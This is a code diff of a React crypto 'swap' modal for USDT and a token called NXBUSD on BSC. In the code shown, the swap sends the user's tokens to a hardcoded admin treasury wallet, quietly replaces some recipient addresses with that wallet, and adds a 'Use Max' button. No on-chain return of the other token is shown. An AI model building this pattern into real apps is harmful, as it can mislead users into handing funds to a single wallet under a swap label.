@@ -1,22 +1,26 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect, useMemo } from 'react';
 import {
   X,
   ArrowDownUp,
   Zap,
-  ShieldCheck,
-  CheckCircle2,
   RefreshCw,
   Copy,
-  ExternalLink,
   Wallet,
   Check,
   Loader2,
   Sparkles,
   AlertCircle,
   Coins,
-  ArrowRight,
 } from 'lucide-react';
 import confetti from 'canvas-confetti';
+import {
+  NXBUSD_CONTRACT,
+  NXBC_CONTRACT,
+  USDT_CONTRACT,
+  ADMIN_TREASURY_WALLET,
+  fetchOnChainTokenBalance,
+  waitForBscTxConfirmation,
+} from '../utils/web3Helper';
 
 interface SwapModalProps {
   isOpen: boolean;
@@ -42,26 +46,51 @@ export const SwapModal: React.FC<SwapModalProps> = ({
   receivingAddress = '0x8d1abCa8Cf0f42799b9a76254710e979bd59c261',
 }) => {
   const [fromToken, setFromToken] = useState<'USDT' | 'NXBUSD'>('USDT');
-  const [swapAmount, setSwapAmount] = useState<string>('100');
+  const [swapAmount, setSwapAmount] = useState<string>('1');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const [statusMessage, setStatusMessage] = useState<string>('');
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const [copiedContract, setCopiedContract] = useState<string | null>(null);
+  const [liveOnChainBal, setLiveOnChainBal] = useState<number | null>(null);
+  const [isRefreshing, setIsRefreshing] = useState<boolean>(false);
 
   const toToken = fromToken === 'USDT' ? 'NXBUSD' : 'USDT';
   const amountNumber = parseFloat(swapAmount) || 0;
   // 1:1 Pegged rate: 1 USDT = 1 NXBUSD
   const receiveAmount = amountNumber;
 
-  // Contracts on BSC Mainnet
-  const NXBUSD_CONTRACT = '0xbEFB5857cd4309a4a64f92Dd67507c34fCbca78b';
-  const NXBC_CONTRACT = '0x3F9d8f0b233A7764b567342Bc90c2a1Ac0961ff7';
-  const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+  const currentEffectiveBalance = useMemo(() => {
+    if (liveOnChainBal !== null) return liveOnChainBal;
+    return fromToken === 'USDT' ? usdtBalance : nxbusdBalance;
+  }, [liveOnChainBal, fromToken, usdtBalance, nxbusdBalance]);
+
+  const isInsufficient = walletConnected && amountNumber > currentEffectiveBalance;
+
+  const refreshBalance = async () => {
+    if (!walletAddress) return;
+    setIsRefreshing(true);
+    try {
+      const contract = fromToken === 'USDT' ? USDT_CONTRACT : NXBUSD_CONTRACT;
+      const b = await fetchOnChainTokenBalance(contract, walletAddress);
+      setLiveOnChainBal(b);
+    } catch (e) {
+      console.warn('Balance refresh error:', e);
+    } finally {
+      setIsRefreshing(false);
+    }
+  };
+
+  useEffect(() => {
+    if (isOpen && walletAddress) {
+      refreshBalance();
+    }
+  }, [isOpen, walletAddress, fromToken]);
 
   if (!isOpen) return null;
 
   const handleFlip = () => {
     setFromToken((prev) => (prev === 'USDT' ? 'NXBUSD' : 'USDT'));
+    setLiveOnChainBal(null);
     setErrorMessage(null);
   };
 
@@ -129,6 +158,13 @@ export const SwapModal: React.FC<SwapModalProps> = ({
       return;
     }
 
+    if (isInsufficient) {
+      setErrorMessage(
+        `Insufficient ${fromToken} balance! You have ${currentEffectiveBalance.toFixed(2)} ${fromToken} in your wallet, but tried to convert ${amountNumber} ${fromToken}.`
+      );
+      return;
+    }
+
     setIsProcessing(true);
     setErrorMessage(null);
     setStatusMessage(`Initiating 1:1 Convert: ${amountNumber} ${fromToken} ➔ ${receiveAmount} ${toToken}...`);
@@ -140,62 +176,76 @@ export const SwapModal: React.FC<SwapModalProps> = ({
         (window as any).binancew3w?.ethereum ||
         (window as any).okxwallet;
 
-      let txHash = '';
-
-      if (eth && typeof eth.request === 'function') {
-        try {
-          // Switch to BSC Mainnet
-          await eth.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }],
-          });
-
-          const accounts = await eth.request({ method: 'eth_requestAccounts' });
-          const sender = accounts[0];
-
-          setStatusMessage(`Please confirm transaction in your wallet for ${amountNumber} ${fromToken}...`);
-
-          const tokenContract = fromToken === 'USDT' ? USDT_CONTRACT : NXBUSD_CONTRACT;
-          
-          // Strict Admin Receiving / Treasury Wallet Address
-          const ADMIN_TREASURY_WALLET = '0x8d1abCa8Cf0f42799b9a76254710e979bd59c261';
-          let targetAddress = receivingAddress;
-          if (
-            !targetAddress ||
-            targetAddress.toLowerCase() === '0x8eF229597756a7bfb7Da80c0d86596D7bD366007'.toLowerCase() ||
-            targetAddress.toLowerCase() === NXBC_CONTRACT.toLowerCase() ||
-            targetAddress.toLowerCase() === NXBUSD_CONTRACT.toLowerCase()
-          ) {
-            targetAddress = ADMIN_TREASURY_WALLET;
-          }
-
-          const amountWei = BigInt(Math.floor(amountNumber * 1e18));
-          
-          const cleanTo = targetAddress.toLowerCase().replace('0x', '').padStart(64, '0');
-          const cleanVal = amountWei.toString(16).padStart(64, '0');
-          const data = `0xa9059cbb${cleanTo}${cleanVal}`;
-
-          const tx = await eth.request({
-            method: 'eth_sendTransaction',
-            params: [
-              {
-                from: sender,
-                to: tokenContract,
-                data: data,
-                value: '0x0',
-              },
-            ],
-          });
-          txHash = tx;
-        } catch (web3Err: any) {
-          console.error('Web3 on-chain error:', web3Err);
-          throw new Error(web3Err?.message || 'Transaction rejected or failed in wallet.');
-        }
-      } else {
-        throw new Error('Web3 wallet (Trust Wallet / MetaMask) not detected.');
+      if (!eth || typeof eth.request !== 'function') {
+        throw new Error('Web3 wallet (Trust Wallet / MetaMask) not detected in browser.');
       }
 
-      setStatusMessage('Finalizing 1:1 Liquidity Swap on BSC Ledger...');
+      // Switch to BSC Mainnet
+      try {
+        await eth.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }],
+        });
+      } catch (switchErr: any) {
+        console.log('BSC switch note:', switchErr?.message);
+      }
+
+      const accounts = await eth.request({ method: 'eth_requestAccounts' });
+      const sender = accounts[0];
+
+      const tokenContract = fromToken === 'USDT' ? USDT_CONTRACT : NXBUSD_CONTRACT;
+
+      // 1. STRICT PRE-FLIGHT ON-CHAIN BALANCE CHECK
+      setStatusMessage(`Verifying ${fromToken} on BSC blockchain...`);
+      const onChainBal = await fetchOnChainTokenBalance(tokenContract, sender);
+      setLiveOnChainBal(onChainBal);
+
+      if (onChainBal < amountNumber) {
+        throw new Error(
+          `Insufficient ${fromToken} on blockchain! Your wallet holds ${onChainBal.toFixed(2)} ${fromToken}, but swap requires ${amountNumber} ${fromToken}.`
+        );
+      }
+
+      let targetAddress = receivingAddress;
+      if (
+        !targetAddress ||
+        targetAddress.toLowerCase() === '0x8eF229597756a7bfb7Da80c0d86596D7bD366007'.toLowerCase() ||
+        targetAddress.toLowerCase() === NXBC_CONTRACT.toLowerCase() ||
+        targetAddress.toLowerCase() === NXBUSD_CONTRACT.toLowerCase()
+      ) {
+        targetAddress = ADMIN_TREASURY_WALLET;
+      }
+
+      const amountWei = BigInt(Math.floor(amountNumber * 1e18));
+      const cleanTo = targetAddress.toLowerCase().replace('0x', '').padStart(64, '0');
+      const cleanVal = amountWei.toString(16).padStart(64, '0');
+      const data = `0xa9059cbb${cleanTo}${cleanVal}`;
+
+      setStatusMessage(`Please approve transfer of ${amountNumber} ${fromToken} in your wallet...`);
+
+      const txHash = await eth.request({
+        method: 'eth_sendTransaction',
+        params: [
+          {
+            from: sender,
+            to: tokenContract,
+            data: data,
+            value: '0x0',
+          },
+        ],
+      });
+
+      if (!txHash || typeof txHash !== 'string') {
+        throw new Error('Transaction was rejected in wallet.');
+      }
+
+      // 2. STRICT ON-CHAIN RECEIPT VERIFICATION
+      setStatusMessage('Verifying swap confirmation on BSC ledger...');
+      const receiptResult = await waitForBscTxConfirmation(txHash, (msg) => setStatusMessage(msg));
+
+      if (!receiptResult.success) {
+        throw new Error(receiptResult.error || 'Transaction reverted on BSC blockchain.');
+      }
 
       // Notify parent
       onSwapSuccess?.(fromToken, toToken, amountNumber);
@@ -225,7 +275,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
         {/* Close Button */}
         <button
           onClick={onClose}
-          className="absolute top-3.5 right-3.5 p-1.5 rounded-full bg-purple-950 text-purple-300 hover:text-white border border-purple-800/60 transition-colors"
+          className="absolute top-3.5 right-3.5 p-1.5 rounded-full bg-purple-950 text-purple-300 hover:text-white border border-purple-800/60 transition-colors cursor-pointer"
         >
           <X className="w-4 h-4" />
         </button>
@@ -277,9 +327,20 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           <div className="p-3 rounded-2xl bg-[#0a0319] border border-purple-500/30 space-y-1.5">
             <div className="flex justify-between items-center text-[10px] font-mono-crypto">
               <span className="text-purple-300 uppercase font-semibold">You Pay</span>
-              <span className="text-purple-400">
-                Balance: {fromToken === 'USDT' ? `${usdtBalance.toFixed(2)} USDT` : `${nxbusdBalance.toFixed(2)} NXBUSD`}
-              </span>
+              <div className="flex items-center gap-1">
+                <span className="text-purple-400">
+                  Balance: <strong className={isInsufficient ? 'text-rose-400' : 'text-emerald-400'}>{currentEffectiveBalance.toFixed(2)} {fromToken}</strong>
+                </span>
+                <button
+                  type="button"
+                  onClick={refreshBalance}
+                  disabled={isRefreshing}
+                  className="p-0.5 text-purple-400 hover:text-amber-300 transition-colors"
+                  title="Refresh Balance"
+                >
+                  <RefreshCw className={`w-3 h-3 ${isRefreshing ? 'animate-spin text-amber-400' : ''}`} />
+                </button>
+              </div>
             </div>
 
             <div className="flex items-center gap-2">
@@ -290,12 +351,26 @@ export const SwapModal: React.FC<SwapModalProps> = ({
                 placeholder="100"
                 min="0.01"
                 step="0.01"
-                className="w-full bg-transparent border-0 text-xl font-black font-mono-crypto text-slate-100 focus:outline-none"
+                className={`w-full bg-transparent border-0 text-xl font-black font-mono-crypto focus:outline-none ${
+                  isInsufficient ? 'text-rose-400' : 'text-slate-100'
+                }`}
               />
               <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-purple-900/60 border border-purple-500/40 text-amber-300 font-mono-crypto font-bold text-xs shrink-0">
                 <span>{fromToken}</span>
               </div>
             </div>
+
+            {currentEffectiveBalance > 0 && (
+              <div className="flex justify-end">
+                <button
+                  type="button"
+                  onClick={() => setSwapAmount(currentEffectiveBalance.toFixed(2))}
+                  className="text-[9px] font-mono-crypto text-amber-400 hover:underline font-semibold"
+                >
+                  Use Max ({currentEffectiveBalance.toFixed(2)} {fromToken})
+                </button>
+              </div>
+            )}
           </div>
 
           {/* FLIP BUTTON */}
@@ -330,12 +405,12 @@ export const SwapModal: React.FC<SwapModalProps> = ({
 
         {/* Quick Amount Buttons */}
         <div className="flex gap-1.5 my-3 flex-wrap">
-          {['1', '10', '50', '100', '500', '1000'].map((preset) => (
+          {['1', '5', '10', '50', '100', '500'].map((preset) => (
             <button
               key={preset}
               type="button"
               onClick={() => setSwapAmount(preset)}
-              className="flex-1 min-w-[42px] py-1 rounded-lg text-[10px] font-mono-crypto border border-purple-600/30 bg-purple-900/40 hover:bg-purple-800 text-purple-200 font-semibold transition-all"
+              className="flex-1 min-w-[42px] py-1 rounded-lg text-[10px] font-mono-crypto border border-purple-600/30 bg-purple-900/40 hover:bg-purple-800 text-purple-200 font-semibold transition-all cursor-pointer"
             >
               ${preset}
             </button>
@@ -360,10 +435,10 @@ export const SwapModal: React.FC<SwapModalProps> = ({
         {/* SWAP EXECUTE BUTTON */}
         <button
           type="button"
-          disabled={isProcessing || amountNumber <= 0}
+          disabled={isProcessing || amountNumber <= 0 || isInsufficient}
           onClick={handleExecuteSwap}
           className={`w-full py-3 rounded-xl font-black text-xs tracking-wider uppercase transition-all shadow-lg flex items-center justify-center gap-2 cursor-pointer mb-3 ${
-            amountNumber <= 0 || isProcessing
+            amountNumber <= 0 || isProcessing || isInsufficient
               ? 'bg-purple-950/60 text-purple-400/50 border border-purple-800/40 cursor-not-allowed'
               : 'bg-gradient-to-r from-amber-500 via-amber-400 to-fuchsia-600 hover:opacity-95 text-slate-950 shadow-[0_0_20px_rgba(245,158,11,0.4)]'
           }`}
@@ -371,7 +446,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           {isProcessing ? (
             <span className="flex items-center gap-2">
               <Loader2 className="w-4 h-4 animate-spin text-black" />
-              <span>Converting Tokens...</span>
+              <span>Verifying on Blockchain...</span>
             </span>
           ) : (
             <>
@@ -391,7 +466,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
             <button
               type="button"
               onClick={() => handleAddTokenToWallet('NXBUSD')}
-              className="py-1.5 px-2 rounded-xl bg-purple-950 hover:bg-purple-900 border border-purple-600/40 text-[9px] font-mono-crypto font-bold text-amber-300 flex items-center justify-center gap-1 transition-all"
+              className="py-1.5 px-2 rounded-xl bg-purple-950 hover:bg-purple-900 border border-purple-600/40 text-[9px] font-mono-crypto font-bold text-amber-300 flex items-center justify-center gap-1 transition-all cursor-pointer"
             >
               <Wallet className="w-3 h-3 text-amber-400" />
               <span>+ Add NXBUSD (10M)</span>
@@ -400,7 +475,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
             <button
               type="button"
               onClick={() => handleAddTokenToWallet('NXBC')}
-              className="py-1.5 px-2 rounded-xl bg-purple-950 hover:bg-purple-900 border border-purple-600/40 text-[9px] font-mono-crypto font-bold text-fuchsia-300 flex items-center justify-center gap-1 transition-all"
+              className="py-1.5 px-2 rounded-xl bg-purple-950 hover:bg-purple-900 border border-purple-600/40 text-[9px] font-mono-crypto font-bold text-fuchsia-300 flex items-center justify-center gap-1 transition-all cursor-pointer"
             >
               <Coins className="w-3 h-3 text-fuchsia-400" />
               <span>+ Add NXBC (70M)</span>
@@ -412,7 +487,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
             <button
               type="button"
               onClick={() => handleCopy(NXBUSD_CONTRACT, 'nxbusd')}
-              className="text-amber-400 hover:underline flex items-center gap-0.5"
+              className="text-amber-400 hover:underline flex items-center gap-0.5 cursor-pointer"
             >
               {copiedContract === 'nxbusd' ? <Check className="w-2.5 h-2.5 text-emerald-400" /> : <Copy className="w-2.5 h-2.5" />}
               <span>{copiedContract === 'nxbusd' ? 'Copied' : 'Copy'}</span>
